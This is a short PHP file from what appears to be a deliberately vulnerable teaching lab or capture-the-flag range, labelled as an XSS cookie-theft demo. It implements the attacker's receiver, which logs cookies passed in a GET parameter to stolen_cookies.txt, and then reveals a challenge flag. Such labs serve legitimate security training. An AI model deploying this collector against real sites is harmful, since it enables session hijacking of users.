<?php
/**
 * LH-YY-02 vulnerable.php - 漏洞演示
 * 分类：xss_cookie
 *
 * ⚠️ 教学用代码，故意存在漏洞
 * 修真靶场默认 display_errors=On、allow_url_include=On 等
 */

// 【漏洞】XSS 窃取 Cookie
// 假设这是攻击者的接收端（演示）
$cookie = $_GET['c'] ?? '';
file_put_contents(__DIR__ . '/stolen_cookies.txt', $cookie . "\n", FILE_APPEND);
echo "OK";
require_once __DIR__ . '/../../../../app/bootstrap_challenge.php';
xxr_flag_reveal('xss');
